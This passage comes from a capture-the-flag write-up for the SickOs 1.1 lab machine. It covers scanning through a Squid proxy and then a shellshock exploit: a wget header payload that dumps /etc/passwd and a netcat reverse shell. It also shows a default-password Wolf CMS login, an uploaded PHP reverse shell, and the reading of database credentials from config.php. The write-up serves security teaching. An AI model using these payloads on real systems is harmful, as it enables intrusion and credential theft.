<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.149 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.149    00:0c:29:48:e9:66   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:ea:f1:fb   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.603 seconds <span class="o">(</span>98.35 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.149</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.149/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2015-12-16 11:23:26 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.149
</span><span class='line'>Discovered open port 3128/tcp on 10.1.1.149
</span></code></pre></td></tr></table></div></figure>


<p>There are 2 ports (22, 3128) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># Nmap 6.49BETA5 scan initiated Wed Dec 16 06:25:04 2015 as: nmap -v -O -A -sV -p22,3128 -oN 10.1.1.149_nmap.txt 10.1.1.149</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.149
</span><span class='line'>Host is up <span class="o">(</span>0.0027s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE    VERSION
</span><span class='line'>22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_  <span class="m">256</span> 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>3128/tcp open  http-proxy Squid http proxy 3.1.19
</span><span class='line'><span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 400<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-open-proxy: Potentially OPEN proxy.
</span><span class='line'><span class="p">|</span>_Methods supported:GET
</span><span class='line'><span class="p">|</span>_http-server-header: squid/3.1.19
</span><span class='line'><span class="p">|</span>_http-title: ERROR: The requested URL could not be retrieved
</span><span class='line'>MAC Address: 00:0C:29:48:E9:66 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.019 days <span class="o">(</span>since Wed Dec <span class="m">16</span> 05:58:20 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result, I noticed that <code>OpenSSH 5.9p1</code> and <code>Squid Proxy v3.1.19</code> are running on port 22 and 3128. By searching exist exploit online against the squid proxy, I found the following misconfiguration vulnerability in rapid7: <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning" title="Squid Proxy Port Scanner">Squid proxy port scanner</a>, which can be used to do an internal network scan.</p>

<p>So I start <code>msfconsole</code> and loaded the exploit <code>squid_pivot_scanning</code> with the following optoins:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt; show options
</span><span class='line'>
</span><span class='line'>Module options <span class="o">(</span>auxiliary/scanner/http/squid_pivot_scanning<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>   Name          Current Setting                                  Required  Description
</span><span class='line'>   ----          ---------------                                  --------  -----------
</span><span class='line'>   CANARY_IP     1.2.3.4                                          yes       The IP to check <span class="k">if</span> the proxy always answers positively<span class="p">;</span> the IP should not respond.
</span><span class='line'>   MANUAL_CHECK  <span class="nb">true                                             </span>yes       Stop the scan <span class="k">if</span> server seems to answer positively to every request
</span><span class='line'>   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan<span class="p">;</span> must be TCP
</span><span class='line'>   Proxies                                                        no        A proxy chain of format <span class="nb">type</span>:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
</span><span class='line'>   RANGE         10.1.1.149                                       yes       IPs to scan through Squid proxy
</span><span class='line'>   RHOSTS        10.1.1.149                                       yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT         <span class="m">3128</span>                                             yes       The target port
</span><span class='line'>   THREADS       <span class="m">200</span>                                              yes       The number of concurrent threads
</span><span class='line'>   VHOST                                                          no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure>


<p>Run it and got the following result, TCP port 80 seems open:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">21</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149:80 seems OPEN
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">139</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">445</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">1433</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">1521</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">1723</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">3389</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">8080</span> is CLOSED
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>10.1.1.149<span class="o">]</span> 10.1.1.149 is alive but <span class="m">9100</span> is CLOSED
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
</span><span class='line'>msf auxiliary<span class="o">(</span>squid_pivot_scanning<span class="o">)</span> &gt;
</span></code></pre></td></tr></table></div></figure>


<p>In order to the verify if port 80 is open, I start up firefox and set the proxy points to <code>10.1.1.149:3128</code> then access <code>http://10.1.1.149/</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/1.png"></p>

<p>and yes, there is web service listening on target machine&rsquo;s port 80.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/2.png"></p>

<p>Then I use <code>nikto</code> to scan common web vulnerabilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.149
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET Retrieved via header: 1.0 localhost <span class="o">(</span>squid/3.1.19<span class="o">)</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;x-cache-lookup&#39;</span> found, with contents: MISS from localhost:3128
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;x-cache&#39;</span> found, with contents: MISS from localhost
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, inode: 265381, size: 45, mtime: Fri Dec  <span class="m">4</span> 19:35:02 2015
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;x-squid-error&#39;</span> found, with contents: ERR_INVALID_REQ 0
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;tcn&#39;</span> found, with contents: list
</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15. The following alternatives <span class="k">for</span> <span class="s1">&#39;index&#39;</span> were found: index.php
</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;nikto-added-cve-2014-6278&#39;</span> found, with contents: <span class="nb">true</span>
</span><span class='line'>+ OSVDB-112004: GET /cgi-bin/status: Site appears vulnerable to the <span class="s1">&#39;shellshock&#39;</span> vulnerability <span class="o">(</span>CVE-2014-6271<span class="o">)</span>.
</span><span class='line'>+ OSVDB-112004: GET /cgi-bin/status: Site appears vulnerable to the <span class="s1">&#39;shellshock&#39;</span> vulnerability <span class="o">(</span>CVE-2014-6278<span class="o">)</span>.
</span><span class='line'>+ ZSMPGCHN Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-12184: GET /?<span class="o">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
</span><span class='line'>+ OSVDB-3093: GET /.bash_history: A user<span class="err">&#39;</span>s home directory may be <span class="nb">set </span>to the web root, the shell <span class="nb">history </span>was retrieved. This should not be accessible via the web.
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span></code></pre></td></tr></table></div></figure>


<p>From the result, a <code>shellsock</code> vulnerability was found in target server under the path <code>/cgi-bin/status</code>.</p>

<p>In the meanwhile, I also run <code>wfuzz</code> to brute force crack/scan the hidden files/directories on the target server.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/SickOs# wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt --hc <span class="m">404</span> -p 10.1.1.149:3128 http://10.1.1.149/FUZZ
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://10.1.1.149/FUZZ
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">87664</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID    Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00001:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - # Copyright 2007 James Fisher&quot;</span>
</span><span class='line'>00002:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot;sit http://creativecommons.org/licenses/by-sa/3.0/&quot;</span>
</span><span class='line'>00003:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - #&quot;</span>
</span><span class='line'>00004:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot;ered case sensative list, where entries were found&quot;</span>
</span><span class='line'>00005:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - #&quot;</span>
</span><span class='line'>00006:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot;on-Share Alike 3.0 License. To view a copy of this&quot;</span>
</span><span class='line'>00007:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - #&quot;</span>
</span><span class='line'>00008:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - &quot;</span>
</span><span class='line'>00009:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - # on atleast 3 different hosts&quot;</span>
</span><span class='line'>00011:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - #&quot;</span>
</span><span class='line'>00014:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot;# This work is licensed under the Creative Commons&quot;</span>
</span><span class='line'>00015:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot;d a letter to Creative Commons, 171 Second Street,&quot;</span>
</span><span class='line'>00016:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - # directory-list-2.3-small.txt&quot;</span>
</span><span class='line'>00010:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; Suite 300, San Francisco, California, 94105, USA.&quot;</span>
</span><span class='line'>00294:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">3</span> W        <span class="m">21</span> Ch     <span class="s2">&quot; - index&quot;</span>
</span><span class='line'>01601:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">4</span> L         <span class="m">17</span> W       <span class="m">109</span> Ch     <span class="s2">&quot; - connect&quot;</span>
</span><span class='line'>01770:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>      <span class="m">3</span> L          <span class="m">6</span> W        <span class="m">45</span> Ch     <span class="s2">&quot; - robots&quot;</span>
</span><span class='line'>Stopping...
</span><span class='line'>
</span><span class='line'>root@kali:~/SickOs#
</span></code></pre></td></tr></table></div></figure>


<p>Here I found three hidden files, after checked them one by one, I noticed that there is another hidden path <code>/wolfcms</code> found in file <code>http://10.1.1.149/robots</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/3.png"></p>

<p><strong><font color="red">[note!!]</font></strong> From now on, there are two attacking vectors against the target server, one is to exploit <code>shellshock</code> vulnerability found previously in <code>http://10.1.1.149/cgi-bin/status</code> and the other one is to find and exploit vulnerability in the CMS system: <code>wolfcms</code>.</p>

<h3>0x00 Verify and exploit shell bug</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/SickOs# wget -q -O- -U -e <span class="nv">use_proxy</span><span class="o">=</span>on -e <span class="nv">http_proxy</span><span class="o">=</span>10.1.1.149:3128 <span class="s2">&quot;http://10.1.1.149&quot;</span>
</span><span class='line'>&lt;h1&gt;
</span><span class='line'>BLEHHH!!!
</span><span class='line'>&lt;/h1&gt;
</span><span class='line'>root@kali:~/SickOs# wget -q -O- -U <span class="s2">&quot;() { test;};echo \&quot;content-type: text/plain\&quot;; echo; echo; /bin/cat /etc/passwd&quot;</span> -e <span class="nv">use_proxy</span><span class="o">=</span>on -e <span class="nv">http_proxy</span><span class="o">=</span>10.1.1.149:3128 <span class="s2">&quot;http://10.1.1.149/cgi-bin/status&quot;</span>
</span><span class='line'>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
</span></code></pre></td></tr></table></div></figure>


<p>It works!, the file <code>/etc/passwd</code> can be read and I also noticed that there is an user called <code>sickos</code> which would be used to privilege escaping later. <code>shellshock</code> vulnerability has been confirmed and can be exploited.</p>

<p>So then, I setup <code>nc</code> to listen on local port <code>4444</code> and exploit <code>shellshock</code> to get a connection back.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/4.png"></p>

<p>Bingo! Now we have got a limited remote shell connect back to my tcp port <code>4444</code> which is listened by <code>nc</code>.</p>

<h3>0x01 Analyze and exploit Wolf CMS 0.8.2</h3>

<p>By searching online about <code>wolfcms</code>, learn it to know that it has login page: <code>http://10.1.1.149/wolfcms/?/admin/login</code></p>

<p>After tried several weak passwords, I managed to login successful with the weak login credential: <code>admin / admin</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/5.png"></p>

<p>Under the <code>file_manager</code>, I can upload php shell to target server. In this case I uploaded a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">reverse php shell</a> (rsh.php) which will connected back to my Kali&rsquo;s port <code>5555</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/6.png"></p>

<p>Then I have to change the file attributes to <code>0777</code>.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/7.png"></p>

<p>From what I learnt online, the uploaded php shell can be found in <code>/public/</code> folder, so I set up <code>nc</code> again to listen on port <code>5555</code> and visit this URL <code>http://10.1.1.149/wolfcms/public/rsh.php</code> to trigger the reverse shell.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/SickOs1.1/8.png"></p>

<p>Now I get in~</p>

<p>It&rsquo;s time to ROOT!</p>

<p>After enumeration on the file system, I found a configuration file which including sensitive information / login credentials, the file location is <code>/var/www/wolfcms/config.php</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@SickOs:/usr/lib/cgi-bin<span class="nv">$ </span>head -n <span class="m">15</span> /var/www/wolfcms/config.php
</span><span class='line'>head -n <span class="m">15</span> /var/www/wolfcms/config.php
</span><span class='line'>&lt;<span class="se">\?</span>php
</span><span class='line'>
</span><span class='line'>// Database information:
</span><span class='line'>// <span class="k">for</span> SQLite, use sqlite:/tmp/wolf.db <span class="o">(</span>SQLite 3<span class="o">)</span>
</span><span class='line'>// The path can only be absolute path or :memory:
</span><span class='line'>// For more info look at: www.php.net/pdo
</span><span class='line'>
</span><span class='line'>// Database settings:
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;DB_DSN&#39;</span>, <span class="s1">&#39;mysql:dbname=wolf;host=localhost;port=3306&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;root&#39;</span><span class="o">)</span><span class="p">;</span>
